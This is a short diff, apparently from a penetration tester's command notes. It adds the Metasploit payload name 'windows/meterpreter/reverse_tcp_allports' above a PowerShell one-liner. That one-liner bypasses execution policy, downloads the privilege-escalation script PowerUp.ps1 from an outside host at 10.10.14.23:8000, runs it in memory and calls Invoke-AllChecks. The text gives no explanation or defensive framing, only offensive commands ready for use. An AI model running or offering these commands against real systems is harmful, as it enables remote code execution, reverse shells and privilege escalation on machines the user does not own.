@@ -1,3 +1,5 @@
+windows/meterpreter/reverse_tcp_allports
+
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1'); Invoke-AllChecks"
 
 
